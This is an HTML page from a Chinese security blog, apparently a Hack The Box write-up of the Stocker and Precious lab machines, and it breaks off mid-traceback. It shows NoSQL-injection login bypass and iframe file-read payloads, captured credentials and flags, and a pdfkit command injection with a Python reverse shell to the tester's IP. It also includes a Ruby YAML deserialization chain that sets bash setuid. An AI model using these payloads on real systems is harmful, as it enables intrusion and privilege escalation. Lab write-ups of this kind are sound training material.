@@ -1,0 +1,1925 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="n3ym4r">
+    
+    <title>
+        
+            HTB-easy Machines系列 |
+        
+        n3ym4r&#39;s blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/logo.svg">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.9/source/fontawesome/css/fontawesome.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.9/source/fontawesome/css/regular.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.9/source/fontawesome/css/solid.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.9/source/fontawesome/css/brands.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.json"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true},"style":{"primary_color":"#5ed5cc","logo":"/images/logo.svg","favicon":"/images/logo.svg","avatar":"/images/logo.svg","font_size":null,"font_family":null,"left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"header_transparent":false,"background_img":"/images/bg.svg","description":"Pay attention to safety!","font_color":null,"hitokoto":{"enable":true}},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":true}}},"local_search":{"enable":true,"preload":true},"code_copy":{},"code_block_tools":{"enable":true,"style":"default"},"side_tools":{},"pjax":{"enable":true},"lazyload":{"enable":false},"version":"3.4.9"};
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"};
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="/images/logo.svg">
+                </a>
+            
+            <a class="logo-title" href="/">
+               n3ym4r&#39;s blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                标签
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/links"
+                            >
+                                友链
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                关于
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">标签</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/links">友链</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">关于</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">HTB-easy Machines系列</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/logo.svg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">n3ym4r</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        
+<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        
+            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
+        
+        <span class="pc">2023-02-12 15:49:14</span>
+        <span class="mobile">2023-02-12 15:49</span>
+    </span>
+    
+        <span class="article-update-date article-meta-item">
+        <i class="fas fa-file-pen"></i>&nbsp;
+        <span class="pc">2023-02-12 15:50:24</span>
+    </span>
+    
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/%E6%89%93%E9%9D%B6/">打靶</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/HTB/">HTB</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>10.1k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>57 分钟</span>
+        </span>
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h2 id="Stocker"><a href="#Stocker" class="headerlink" title="Stocker"></a>Stocker</h2><h3 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h3><pre><code class="shell">┌──(root💀kali)-[~]
+└─# nmap -sV 10.10.11.196
+Starting Nmap 7.91 ( https://nmap.org ) at 2023-02-10 20:53 EST
+Nmap scan report for stocker.htb (10.10.11.196)
+Host is up (2.1s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 26.41 seconds
+</code></pre>
+<span id="more"></span>
+
+<p>curl发现80端口的域名</p>
+<pre><code class="shell">└─# curl 10.10.11.196 --head
+HTTP/1.1 301 Moved Permanently
+Server: nginx/1.18.0 (Ubuntu)
+Date: Sat, 11 Feb 2023 02:21:56 GMT
+Content-Type: text/html
+Content-Length: 178
+Connection: keep-alive
+Location: http://stocker.htb
+</code></pre>
+<p>在&#x2F;etc&#x2F;hosts中添加，访问网页，没什么有用信息</p>
+<h3 id="子域名枚举"><a href="#子域名枚举" class="headerlink" title="子域名枚举"></a>子域名枚举</h3><p>工具很多，只有字典选得好就行了，我这里使用了kali的字典集seclists下的子域名爆破字典。</p>
+<pre><code class="shell">┌──(root💀kali)-[~]
+└─# ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://FUZZ.stocker.htb
+
+        /&#39;___\  /&#39;___\           /&#39;___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.5.0 Kali Exclusive &lt;3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://FUZZ.stocker.htb
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+________________________________________________
+
+dev                     [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 953ms]
+</code></pre>
+<p>爆出dev子域名，添加到etc&#x2F;hosts文件，访问，是个登录窗口，随意输入抓个包看看</p>
+<h3 id="NOsql注入"><a href="#NOsql注入" class="headerlink" title="NOsql注入"></a>NOsql注入</h3><p><a class="link"   target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/nosql-injection#basic-authentication-bypass" >相关链接<i class="fas fa-external-link-alt"></i></a></p>
+<p><strong>requst</strong></p>
+<pre><code>POST /login HTTP/1.1
+
+Host: dev.stocker.htb
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+Accept-Encoding: gzip, deflate
+
+Content-Type: application/x-www-form-urlencoded
+
+Content-Length: 29
+
+Origin: http://dev.stocker.htb
+
+Connection: close
+
+Referer: http://dev.stocker.htb/login
+
+Cookie: connect.sid=s%3AFWIdQ3-xL3iYmpJqnfHYkkn1fz-VC_0m.W10CYIEr6Dtiy%2Bg8VuESaTI84n6lEd17mWNsaYNDFn0
+
+Upgrade-Insecure-Requests: 1
+
+
+
+username=admin&amp;password=admin
+</code></pre>
+<p><strong>respose</strong></p>
+<pre><code class="http">HTTP/1.1 302 Found
+
+Server: nginx/1.18.0 (Ubuntu)
+
+Date: Sat, 11 Feb 2023 02:16:13 GMT
+
+Content-Type: text/html; charset=utf-8
+
+Content-Length: 92
+
+Connection: close
+
+X-Powered-By: Express
+
+Location: /login?error=login-error
+
+Vary: Accept
+
+
+
+&lt;p&gt;Found. Redirecting to &lt;a href=&quot;/login?error=login-error&quot;&gt;/login?error=login-error&lt;/a&gt;&lt;/p&gt;
+</code></pre>
+<p>使用bp抓包，将登录参数改为json代码，同时将Content-Type随之更改</p>
+<p><strong>requst</strong></p>
+<pre><code class="http">POST /login HTTP/1.1
+
+Host: dev.stocker.htb
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+Accept-Encoding: gzip, deflate
+
+Content-Type: application/json
+
+Content-Length: 55
+
+Origin: http://dev.stocker.htb
+
+Connection: close
+
+Referer: http://dev.stocker.htb/login
+
+Cookie: connect.sid=s%3AFWIdQ3-xL3iYmpJqnfHYkkn1fz-VC_0m.W10CYIEr6Dtiy%2Bg8VuESaTI84n6lEd17mWNsaYNDFn0
+
+Upgrade-Insecure-Requests: 1
+
+
+
+&#123;&quot;username&quot;: &#123;&quot;$ne&quot;: null&#125;, &quot;password&quot;: &#123;&quot;$ne&quot;: null&#125; &#125;
+</code></pre>
+<p><strong>respose</strong></p>
+<pre><code class="http">HTTP/1.1 302 Found
+
+Server: nginx/1.18.0 (Ubuntu)
+
+Date: Sat, 11 Feb 2023 02:55:44 GMT
+
+Content-Type: text/html; charset=utf-8
+
+Content-Length: 56
+
+Connection: close
+
+X-Powered-By: Express
+
+Location: /stock
+
+Vary: Accept
+
+Set-Cookie: connect.sid=s%3AQBv56UBK59KlhesFqTHFoMs8cz_xJDRs.nXEOSd52fW7zT2Ojs4Hn%2Bu9oiUmKPEaSjWk8VKjTbyc; Path=/; HttpOnly
+
+
+
+&lt;p&gt;Found. Redirecting to &lt;a href=&quot;/stock&quot;&gt;/stock&lt;/a&gt;&lt;/p&gt;
+</code></pre>
+<p>重定向到了&#x2F;stock页面，在浏览器中查看</p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/24/image.6ixs1oe55w80.webp" alt="image"></p>
+<p>是个购物网站，简单走一下流程，选购好东西后，点view cart提交账单后，弹出以下界面</p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/24/image.45xin3hjk4e0.webp" alt="image"></p>
+<p>显示orderID和一个超链接，点击，会定位到&#x2F;api&#x2F;po&#x2F;orderID,同时显示所购买的商品</p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/24/image.3g1k0lra6840.webp" alt="image"></p>
+<p>抓包查看具体数据包</p>
+<pre><code class="http">POST /api/order HTTP/1.1
+
+Host: dev.stocker.htb
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+
+Accept: */*
+
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+Accept-Encoding: gzip, deflate
+
+Referer: http://dev.stocker.htb/stock
+
+Content-Type: application/json
+
+Origin: http://dev.stocker.htb
+
+Content-Length: 162
+
+Connection: close
+
+Cookie: connect.sid=s%3AXCU2j-Ge2IfqK8UyCTbeoP3b5cXEsFDl.tML7SoE%2BTzG8r0FHxV8l66ypAgjazZEBEreIW5GClLw
+
+
+
+&#123;&quot;basket&quot;:[&#123;&quot;_id&quot;:&quot;638f116eeb060210cbd83a8d&quot;,&quot;title&quot;:&quot;Cup&quot;,&quot;description&quot;:&quot;It&#39;s a red cup.&quot;,&quot;image&quot;:&quot;red-cup.jpg&quot;,&quot;price&quot;:32,&quot;currentStock&quot;:4,&quot;__v&quot;:0,&quot;amount&quot;:1&#125;]&#125;
+</code></pre>
+<pre><code class="http">HTTP/1.1 200 OK
+
+Server: nginx/1.18.0 (Ubuntu)
+
+Date: Sat, 11 Feb 2023 03:08:25 GMT
+
+Content-Type: application/json; charset=utf-8
+
+Content-Length: 53
+
+Connection: close
+
+X-Powered-By: Express
+
+ETag: W/&quot;35-U3nSPD6OYldWF6R+73GibB6cpYA&quot;
+
+
+
+&#123;&quot;success&quot;:true,&quot;orderId&quot;:&quot;63e706a93bf31dab4f32ab3c&quot;&#125;
+</code></pre>
+<p>从数据包可以看点requst中json数据中的title会在网页回显，而response中的orderId会在url中显示。这里大概率可以利用本地文件包含。</p>
+<h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><p>将json中的title数据更改为：”title”: “&lt;iframe src&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd height:750px width: 750px&gt;</iframe>“</p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/24/image.2dhb8dx0rxno.webp" alt="image"></p>
+<p>回显成功，这时候我们可以去读源码获取有用信息</p>
+<p>利用wappalyzer得到编程语言为node，那么就应该去读取index.js</p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/24/image.3y0rcuwcpky0.webp" alt="image"></p>
+<p>将title数据改为 “title”: “&lt;iframe src&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;dev&#x2F;index.js height:10000px width: 8000px&gt;</iframe>“</p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/24/image.82z70ksj0hs.webp" alt="image"></p>
+<p>我们可以看到 index.js 文件的其中一行连接到 mongodb，并且密码以明文形式显示。可以尝试使用获得的凭据 ssh 进入服务器</p>
+<p>angoose:IHeardPassphrasesArePrettySecure</p>
+<pre><code class="shell">-bash-5.0$ pwd
+/home/angoose
+-bash-5.0$ ls -a
+.  ..  .bash_history  .bash_logout  .bashrc  .cache  .mongodb  n3ym4r.js  .profile  user.txt  .viminfo
+-bash-5.0$ cat user.txt
+d750aa79aa54e49f0c4fd0b58c495a68
+</code></pre>
+<p>拿到user flag</p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>执行“sudo -l”，可以看到如果我们执行“.js”类型的文件，就能立即获得 root 访问权限</p>
+<p>那么创建一个.js文件</p>
+<p>这里路径是怎么得出的呢 Linux系统下&#x2F;home 和&#x2F;usr为同级目录要从usr转到home需要往回三次</p>
+<pre><code class="shell">-bash-5.0$ vim n3ym4r.js
+-bash-5.0$ cat n3ym4r.js
+require(&quot;child_process&quot;).spawn(&quot;/usr/bin/bash&quot;, &#123;stdio:[0, 1, 2]&#125;)
+-bash-5.0$ sudo /usr/bin/node /usr/local/scripts/../../../home/angoose/n3ym4r.js
+
+root@stocker:/home/angoose# whoami
+root
+root@stocker:/home/angoose# ls
+n3ym4r.js  user.txt
+root@stocker:/home/angoose# cd ~
+root@stocker:~# ls
+root.txt
+root@stocker:~# cat root.txt
+8ed1a75f8d894c3b51070771dfe4ca67
+root@stocker:~# 
+</code></pre>
+<p>拿到root flag</p>
+<h2 id="Precious"><a href="#Precious" class="headerlink" title="Precious"></a>Precious</h2><h3 id="nmap扫描-1"><a href="#nmap扫描-1" class="headerlink" title="nmap扫描"></a>nmap扫描</h3><pre><code class="shell">┌──(root💀kali)-[~]
+└─# nmap -sC -sV 10.10.11.189
+Starting Nmap 7.91 ( https://nmap.org ) at 2023-02-11 06:56 EST
+Nmap scan report for precious.htb (10.10.11.189)
+Host is up (1.4s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 84:5e:13:a8:e3:1e:20:66:1d:23:55:50:f6:30:47:d2 (RSA)
+|   256 a2:ef:7b:96:65:ce:41:61:c4:67:ee:4e:96:c7:c8:92 (ECDSA)
+|_  256 33:05:3d:cd:7a:b7:98:45:82:39:e7:ae:3c:91:a6:58 (ED25519)
+80/tcp open  http    nginx 1.18.0
+| http-server-header: 
+|   nginx/1.18.0
+|_  nginx/1.18.0 + Phusion Passenger(R) 6.0.15
+|_http-title: Convert Web Page to PDF
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 38.91 seconds
+</code></pre>
+<p>Nmap 显示 <code>80</code> 和 <code>22</code> 端口已打开，80 端口将我们重定向到 <code>precious.htb</code></p>
+<p>将其添加到 <code>/etc/hosts</code> 文件中</p>
+<h3 id="web漏洞发现"><a href="#web漏洞发现" class="headerlink" title="web漏洞发现"></a>web漏洞发现</h3><p>访问页面，网站功能为将输入的url转换为pdf</p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/24/image.3a6xw7f18rm0.webp" alt="image"></p>
+<p>本地起个web服务</p>
+<pre><code class="shell">┌──(root💀kali)-[~]
+└─# python3 -m http.server 80
+</code></pre>
+<p>网页输入我们本机ip，如我们所想生成了一个pdf</p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/24/image.4m19uy2ot6e0.webp" alt="image"></p>
+<p>F12</p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/24/image.5qb230ae49w0.webp" alt="image"></p>
+<p>看到pdf版本为pdfkit v0.8.6,google一下</p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/24/image.3kpqddfvojm0.webp" alt="image"></p>
+<p>存在命令注入漏洞</p>
+<h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><p><a class="link"   target="_blank" rel="noopener" href="https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795" >https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795<i class="fas fa-external-link-alt"></i></a></p>
+<p>简单说在url后跟任意参数，值为想要执行的命令即可</p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/24/image.764gi4soa900.webp" alt="image"></p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/24/image.4ez4z7rga5y0.webp" alt="image"></p>
+<p>成功回显</p>
+<h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>本地开启nc监听</p>
+<pre><code class="shell">└─# nc -lvvp 9999            
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::9999
+Ncat: Listening on 0.0.0.0:9999
+</code></pre>
+<p>网页输入</p>
+<pre><code class="python">http://10.10.16.8/?n=%20`python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.16.8&quot;,9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)&#39;`
+</code></pre>
+<pre><code class="shell">┌──(root💀kali)-[~]
+└─# nc -lvvp 9999            
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::9999
+Ncat: Listening on 0.0.0.0:9999
+Ncat: Connection from 10.10.11.189.
+Ncat: Connection from 10.10.11.189:39340.
+$ ls
+ls
+app  config  config.ru  Gemfile  Gemfile.lock  pdf  public
+$ cd ..
+cd ..
+$ ls
+ls
+html  pdfapp
+$ cd ..
+cd ..
+$ ls
+ls
+backups  cache  lib  local  lock  log  mail  opt  run  spool  tmp  www
+$ cd ..
+cd ..
+$ ls
+ls
+bin   home            lib64       mnt   run   tmp      vmlinuz.old
+boot  initrd.img      libx32      opt   sbin  usr
+dev   initrd.img.old  lost+found  proc  srv   var
+etc   lib             media       root  sys   vmlinuz
+$ cd home
+cd home
+$ ls
+ls
+henry  ruby
+$ cd ruby
+cd ruby
+$ ls -a
+ls -a
+.   .bash_history  .bashrc  .cache  .local    .ssh
+..  .bash_logout   .bundle  .gnupg  .profile
+$ cd .bundle    
+cd .bundle
+$ ls
+ls
+config
+$ cat config 
+cat config
+---
+BUNDLE_HTTPS://RUBYGEMS__ORG/: &quot;henry:Q3c1AqGHtoI0aXAYFH&quot;
+</code></pre>
+<p>在&#x2F;home&#x2F;ruby&#x2F;.bundle&#x2F;config文件下，得到<code>henry</code>用户密码<code>Q3c1AqGHtoI0aXAYFH</code></p>
+<h3 id="ssh连接"><a href="#ssh连接" class="headerlink" title="ssh连接"></a>ssh连接</h3><pre><code class="shell">┌──(root💀kali)-[~]
+└─# ssh henry@10.10.11.189  
+henry@10.10.11.189&#39;s password: 
+Linux precious 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sat Feb 11 06:13:55 2023 from 10.10.14.128
+henry@precious:~$ whoami
+henry
+henry@precious:~$ cd~
+-bash: cd~: command not found
+henry@precious:~$ cd ~
+henry@precious:~$ ls
+user.txt
+henry@precious:~$ cat user.txt
+6e78f78d96b06b9c3fb505a76dc833e7
+henry@precious:~$ 
+</code></pre>
+<p>得到user flag</p>
+<h3 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h3><h4 id="sudo-l"><a href="#sudo-l" class="headerlink" title="sudo -l"></a><code>sudo -l</code></h4><p>查看可以以root权限执行的文件</p>
+<pre><code class="shell">henry@precious:~$ sudo -l
+Matching Defaults entries for henry on precious:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User henry may run the following commands on precious:
+    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
+</code></pre>
+<p>查看脚本文件</p>
+<pre><code class="shell">henry@precious:~$ cat /opt/update_dependencies.rb
+# Compare installed dependencies with those specified in &quot;dependencies.yml&quot;
+require &quot;yaml&quot;
+require &#39;rubygems&#39;
+
+# TODO: update versions automatically
+def update_gems()
+end
+
+def list_from_file
+    YAML.load(File.read(&quot;dependencies.yml&quot;))
+end
+
+def list_local_gems
+    Gem::Specification.sort_by&#123; |g| [g.name.downcase, g.version] &#125;.map&#123;|g| [g.name, g.version.to_s]&#125;
+end
+
+gems_file = list_from_file
+gems_local = list_local_gems
+
+gems_file.each do |file_name, file_version|
+    gems_local.each do |local_name, local_version|
+        if(file_name == local_name)
+            if(file_version != local_version)
+                puts &quot;Installed version differs from the one specified in file: &quot; + local_name
+            else
+                puts &quot;Installed version is equals to the one specified in file: &quot; + local_name
+            end
+        end
+    end
+end
+</code></pre>
+<p>可以看到脚本执行时会加载一个名为<code>dependencies.yml</code>的文件，那么我们就可以在此文件中写入恶意代码，当我们执行此脚本时，会以root权限执行，调用dependencies.yml文件，那么文件中的代码也会是root权限执行的。</p>
+<h4 id="通过-YAML-反序列化的远程代码执行"><a href="#通过-YAML-反序列化的远程代码执行" class="headerlink" title="通过 YAML 反序列化的远程代码执行"></a>通过 YAML 反序列化的远程代码执行</h4><p><a class="link"   target="_blank" rel="noopener" href="https://swisskyrepo.github.io/PayloadsAllTheThingsWeb/Insecure%20Deserialization/YAML/" >https://swisskyrepo.github.io/PayloadsAllTheThingsWeb/Insecure%20Deserialization/YAML/<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/DevComputaria/KnowledgeBase/blob/master/pentesting-web/deserialization/python-yaml-deserialization.md" >https://github.com/DevComputaria/KnowledgeBase/blob/master/pentesting-web/deserialization/python-yaml-deserialization.md<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565#file-ruby_yaml_load_sploit2-yaml" >https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565#file-ruby_yaml_load_sploit2-yaml<i class="fas fa-external-link-alt"></i></a></p>
+<p>在&#x2F;home&#x2F;henry目录下新建<code>dependencies.yml</code>文件，在&#x2F;opt目录是不允许修改文件的</p>
+<pre><code class="shell">henry@precious:~$ vi dependencies.yml
+henry@precious:~$ cat dependencies.yml
+---
+- !ruby/object:Gem::Installer
+    i: x
+- !ruby/object:Gem::SpecFetcher
+    i: y
+- !ruby/object:Gem::Requirement
+  requirements:
+    !ruby/object:Gem::Package::TarReader
+    io: &amp;1 !ruby/object:Net::BufferedIO
+      io: &amp;1 !ruby/object:Gem::Package::TarReader::Entry
+         read: 0
+         header: &quot;abc&quot;
+      debug_output: &amp;1 !ruby/object:Net::WriteAdapter
+         socket: &amp;1 !ruby/object:Gem::RequestSet
+             sets: !ruby/object:Net::WriteAdapter
+                 socket: !ruby/module &#39;Kernel&#39;
+                 method_id: :system
+             git_set: &quot;chmod +s /bin/bash&quot;
+         method_id: :resolve
+</code></pre>
+<p>git_set:这里写命令</p>
+<p>执行脚本</p>
+<pre><code class="shell">henry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb
+sh: 1: reading: not found
+Traceback (most recent call last):
+        33: from /opt/update_dependencies.rb:17:in `&lt;main&gt;&#39;
+        32: from /opt/update_dependencies.rb:10:in `list_from_file&#39;
+        31: from /usr/lib/ruby/2.7.0/psych.rb:279:in `load&#39;
+        30: from /usr/lib/ruby/2.7.0/psych/nodes/node.rb:50:in `to_ruby&#39;
+        29: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept&#39;
+        28: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept&#39;
+        27: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit&#39;
+        26: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:313:in `visit_Psych_Nodes_Document&#39;
+        25: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept&#39;
+        24: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept&#39;
+        23: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit&#39;
+        22: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:141:in `visit_Psych_Nodes_Sequence&#39;
+        21: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `register_empty&#39;
+        20: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `each&#39;
+        19: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `block in register_empty&#39;
+        18: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept&#39;
+        17: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept&#39;
+        16: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit&#39;
+        15: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:208:in `visit_Psych_Nodes_Mapping&#39;
+        14: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:394:in `revive&#39;
+        13: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:402:in `init_with&#39;
+        12: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:218:in `init_with&#39;
+        11: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:214:in `yaml_initialize&#39;
